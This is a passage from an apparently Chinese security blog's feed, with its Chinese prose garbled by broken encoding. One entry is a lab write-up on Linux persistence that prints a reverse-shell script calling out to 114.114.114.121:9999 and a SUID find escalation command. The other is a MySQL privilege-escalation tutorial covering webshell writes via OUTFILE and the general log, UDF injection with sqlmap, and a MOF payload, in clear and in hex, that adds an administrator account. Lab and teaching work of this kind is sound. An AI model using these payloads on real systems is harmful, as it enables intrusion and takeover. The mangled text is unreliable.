    <category term="æ‚ä¸ƒæ‚å…«" scheme="https://clowsman.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
    <category term="æ‚ä¸ƒæ‚å…«" scheme="https://clowsman.github.io/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
  </entry>
  
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬ä¸‰ç« </title>
    <link href="https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2024-07-12T07:53:07.000Z</published>
    <updated>2024-07-15T06:53:06.252Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="linuxæƒé™ç»´æŒ">Linuxæƒé™ç»´æŒ</span></h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  å¯†ç   xjqxwcyc<br>1.é»‘å®¢éšè—çš„éšè—çš„æ–‡ä»¶ å®Œæ•´è·¯å¾„md5<br>2.é»‘å®¢éšè—çš„æ–‡ä»¶åå¼¹shellçš„ip+ç«¯å£ &#123;ip:port&#125;<br>3.é»‘å®¢ææƒæ‰€ç”¨çš„å‘½ä»¤ å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; <br>4.é»‘å®¢å°è¯•æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·å®Œæ•´è·¯å¾„md5<br>5.ä½¿ç”¨å‘½ä»¤è¿è¡Œ ./x.xx æ‰§è¡Œè¯¥æ–‡ä»¶  å°†æŸ¥è¯¢çš„ Exec****** å€¼ ä½œä¸ºflagæäº¤ flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹äº†ä¸€ä¸‹webç›®å½•æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç›´æ¥ç”¨Dç›¾å…¨ç›˜æŸ¥æ€ä¸€ä¸‹</p><blockquote><p>è¿™é‡ŒæŒ‚è½½è¦æŒ‡å®šç«¯å£ï¼ŒæŒ‡å®šç«¯å£çš„å½¢å¼æ˜¯è¿™æ ·çš„ï¼š\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmmä½†æ˜¯å¡ä½äº†æ‰«ä¸å‡ºæ¥ä¸œè¥¿</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>æœ€åæ˜¯åœ¨&#x2F;tmpç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªéšè—æ–‡ä»¶ï¼Œé‡Œé¢æœ‰pythonè„šæœ¬&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>å…¶è„šæœ¬å†…å®¹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>å…¶åå¼¹shellçš„ipå’Œç«¯å£å°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„</p><p>flag{114.114.114.121:9999}</p><blockquote><p>ä¸€å¼€å§‹æ‰¾åˆ°ä¸€ä¸ª1.shçš„è„šæœ¬ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªbashåå¼¹shellä½†æ˜¯é‚£ä¸ªç©æ„ä¸æ˜¯flagï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒæ²¡æ€ä¹ˆæ”¹ã€‚ã€‚ã€‚</p></blockquote><p>æŸ¥çœ‹é»‘å®¢çš„ææƒå‘½ä»¤ï¼Œå…ˆçœ‹&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>æœ‰ä¸ªctfç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°è¯¥ç”¨æˆ·æ‰§è¡Œä¸‹é¢å‘½ä»¤æ‰¾æ˜¯å¦èƒ½å¤Ÿsuidææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>å‘ç°findå‘½ä»¤å°±èƒ½ææƒ</p><p>å…¶ææƒå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmmæ²¡æƒ³æ˜ç™½è¿™ä¸ªæ€è·¯æ˜¯æ€ä¹ˆæ¥çš„ï¼Œçœ‹åˆ«äººçš„wpï¼Œéš¾é“ææƒä¸€å®šæ˜¯suidå—ğŸ˜¥</p></blockquote><p>ç„¶åå°±æ˜¯æ‰¾æ³¨å…¥ä»£ç çš„æ¶æ„å·¥å…·ï¼Œè¿™é‡Œç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>æœç´¢å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ³¨å…¥å·¥å…·ï¼š<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoaæ˜¯ä¸€æ¬¾éšç§˜çš„åé—¨å·¥å…·ï¼Œé€šè¿‡å‘ç›®æ ‡ä¸»æœºä¸Šæ´»è·ƒçš„è¿›ç¨‹æ³¨å…¥æ¶æ„ä»£ç æ¥æ‰§è¡Œåé—¨å·¥ä½œï¼Œè¿™ä¹Ÿåå‘è¯´æ˜äº†ï¼Œå®é™…ä¸ŠCymothoaåé—¨ä¼šæ‹¥æœ‰å’ŒåŸè¿›ç¨‹ç›¸åŒçš„æƒé™ï¼Œä¸”Cymothoaæ˜¯é€šè¿‡å‘ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥shellcodeå»æ‰§è¡Œåé—¨ï¼Œæ‰€ä»¥ä¸ä¼šåƒä»¥å‰å†™è¿‡çš„è®¸å¤šåé—¨ä¸€æ ·åˆ›å»ºè‡ªå·±çš„è¿›ç¨‹ï¼Œè¿™ä½¿å¾—å®ƒçš„éšè”½æ€§æé«˜äº†å¾ˆå¤šã€‚</p></blockquote><p>æ‰€ä»¥å…¶å·¥å…·è·¯å¾„å¦‚ä¸‹ï¼š&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>æœ€åæ‰§è¡Œä¸€ä¸‹è¿™ä¸ª1.pyçš„è„šæœ¬æŸ¥è¯¢ä¸€ä¸‹ç½‘ç»œè¿æ¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>ç„¶åæ‰¾åˆ°ä¸€ä¸ªè½¯é“¾æ¥ï¼Œè¿™ä¸ªå°±æ˜¯flag(æ²¡æ‡‚è·Ÿé¢˜ç›®æè¿°çš„æ­¥éª¤æœ‰ä»€ä¹ˆå…³ç³»</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>è¯´å®è¯æ˜¯åœ¨æ²¡çœ‹æ‡‚è¿™é‡Œæ˜¯ä»€ä¹ˆæ„æ€ï¼Œçœ‹çš„åˆ«äººçš„wpï¼Œæœ‰ç‚¹æ„ä¹‰ä¸æ˜ã€‚ã€‚ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;linuxæƒé™ç»´æŒ&quot;&gt;Linuxæƒé™ç»´æŒ&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;é¶æœºç®€ä»‹&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;</summary>
      
    
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>mysqlææƒ</title>
    <link href="https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/"/>
    <id>https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/</id>
    <published>2024-07-11T17:22:48.000Z</published>
    <updated>2024-07-15T06:41:45.285Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h1><span id="æƒé™è·å–">æƒé™è·å–</span></h1><p>è¦ææƒä¹‹å‰é¦–å…ˆå°±è¦æ‹¿åˆ°mysqlçš„æƒé™ï¼Œè¿™é‡Œå¤§ä½¬çš„æ–‡ç« å·²ç»è¯´çš„å¾ˆè¯¦ç»†äº†ï¼Œæˆ‘å°±è®°å½•ä¸€äº›å†™shellç›¸å…³çš„çŸ¥è¯†</p><p><strong>into outfileå†™shell</strong></p><p>éœ€è¦load_file () å¼€å¯ å³ secure_file_priv æ— é™åˆ¶</p><p>å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NULL</td><td>ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º</td></tr><tr><td>&#x2F;tmp</td><td>åªå…è®¸åœ¨ &#x2F;tmp ç›®å½•å¯¼å…¥å¯¼å‡º</td></tr><tr><td>ç©º</td><td>ä¸é™åˆ¶ç›®å½•</td></tr></tbody></table><blockquote><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</p><p>åœ¨ MySQL 5.5 ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶</p></blockquote><p><strong>æ—¥å¿—å†™shell</strong></p><p>å¯ä»¥ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ—¥å¿—ä½ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br><br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®ï¼Œè¿™æ ·å°±å¯ä»¥å†™shellè¿›å»äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><h1><span id="udfææƒ">udfææƒ</span></h1><p>è‡ªå®šä¹‰å‡½æ•°(user defined function)ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version () ç­‰æ–¹ä¾¿ã€‚</p><h2><span id="æ‰‹å·¥å¤ç°">æ‰‹å·¥å¤ç°</span></h2><p><strong>åŠ¨æ€é“¾æ¥åº“</strong></p><p>è‡ªå®šä¹‰å‡½æ•°æ˜¯æ˜¯ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“çš„å½¢å¼å®ç°çš„ï¼Œå¦‚æœæ˜¯ MySQL &gt;&#x3D; 5.1 çš„ç‰ˆæœ¬ï¼Œå¿…é¡»æŠŠ UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„ lib\plugin æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ã€‚</p><p>åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶å¯ä»¥å»sqlmapå’Œmetasploitå·¥å…·é‡Œé¢å»æ‰¾</p><p><strong>sqlmapçš„udfæ–‡ä»¶ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmapæ ¹ç›®å½•/data/udf/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441364.png" alt="image-20240712174152824"></p><p>é‡Œé¢æœ‰windowså’ŒLinuxçš„32ä½å’Œ64ä½çš„åŠ¨æ€é“¾æ¥åº“</p><p>ä¸è¿‡sqlmapé‡Œçš„åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¯¯æ€ç»è¿‡ç¼–ç å¤„ç†ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨sqlmapè‡ªå¸¦çš„è§£ç å·¥å…·æ¥è¿›è¡Œè§£ç ä½¿ç”¨ï¼Œå·¥å…·åœ¨&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è§£ç  32 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># è§£ç  32 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>Metasploitçš„udfæ–‡ä»¶ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MSFæ ¹ç›®å½•/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441365.png" alt="image-20240713012640874"></p><p>msfè‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ä¸éœ€è¦è§£ç å¯ä»¥ç›´æ¥ä½¿ç”¨</p><blockquote><p>kalié‡Œé¢msfçš„æ ¹ç›®å½•åœ¨&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><p><strong>ä¸‹ä¸€æ­¥å°±æ˜¯å°†é“¾æ¥åº“æ”¾åˆ°æ’ä»¶ç›®å½•ä¸‹</strong></p><p>å¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤æŸ¥æ‰¾æ’ä»¶ç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&quot;%plugin%&quot;</span><br><span class="hljs-comment">#è¿™æ ·ä¹Ÿè¡Œ</span><br><span class="hljs-keyword">select</span> @@plugin_dir;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸å­˜åœ¨çš„è¯å¯ä»¥æ‰¾åˆ° MySQL çš„å®‰è£…ç›®å½•ç„¶åæ‰‹å·¥åˆ›å»º <code>\lib\plugin</code> æ–‡ä»¶å¤¹</p><p>æ‰¾mysqlçš„å®‰è£…ç›®å½•å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> @@basedir;<br></code></pre></td></tr></table></figure><p><strong>å†™å…¥åŠ¨æ€é“¾æ¥åº“</strong></p><p>sqlæ³¨å…¥æ˜¯postæ³¨å…¥å¯ä»¥ç›´æ¥å†™ï¼Œå› ä¸ºgetæœ‰é•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥ç”¨sqlmapæ¥å†™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sqlmap -u &lt;urlåœ°å€&gt; --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ‰‹å·¥ç”¨sqlè¯­å¥å†™è¿›å»ï¼Œè¿™äº›å‰æéƒ½æ˜¯æœ‰å†™æƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›´æ¥ SELECT æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥</span><br>SELECT 0x7f454c4602... INTO OUTFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶çš„è·å–å¯ä»¥ç›´æ¥æœ¬åœ°ç”¨mysqlçš„hexå‡½æ•°ç¼–ç ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›´æ¥ä¼ å…¥è·¯å¾„ç¼–ç </span><br>SELECT hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><br><span class="hljs-comment"># ä¹Ÿå¯ä»¥å°†è·¯å¾„ hex ç¼–ç </span><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));<br></code></pre></td></tr></table></figure><p><strong>ç„¶åå°±æ˜¯åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br>#æŸ¥çœ‹æ˜¯å¦æ–°å¢äº†sys_eval<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br>#ç„¶åå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœæƒ³çœ‹soæ–‡ä»¶é‡Œé¢æœ‰å“ªäº›å‡½æ•°ï¼Œå¯ä»¥æ‹–è¿›idaé‡Œé¢çœ‹ä¸€çœ‹</p></blockquote><h1><span id="mofææƒ">mofææƒ</span></h1><p>è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„æ¼æ´äº†ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚</p><p>ææƒçš„åŸç†æ˜¯ C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p><p><strong>mofè„šæœ¬çš„å†…å®¹</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>) <br><br>instance of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">&quot;)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒpayload</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)<br>#è¿™ä¸¤æ®µæŒ‡ä»¤åˆ†åˆ«æ˜¯ä½¿ç”¨net.exeå·¥å…·æ·»åŠ ä¸€ä¸ªåä¸º<span class="hljs-string">&quot;hacker&quot;</span>çš„æ–°ç”¨æˆ·ï¼Œå¯†ç è®¾ç½®ä¸º<span class="hljs-string">&quot;P@ssw0rd&quot;</span>ã€‚/addå‚æ•°è¡¨ç¤ºæ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·<br>#å°†ç”¨æˆ·<span class="hljs-string">&quot;hacker&quot;</span>æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆlocalgroup administratorsï¼‰ã€‚è¿™æ„å‘³ç€<span class="hljs-string">&quot;hacker&quot;</span>ç”¨æˆ·å°†æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ã€‚<br></code></pre></td></tr></table></figure><p>ä¾ç„¶å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•æŠŠæ–‡ä»¶å˜æˆåå…­è¿›åˆ¶å†™å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸçš„çš„æ—¶å€™ï¼Œtest.mof ä¼šå‡ºç°åœ¨ï¼šc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;good&#x2F; ç›®å½•ä¸‹ å¦åˆ™å‡ºç°åœ¨ 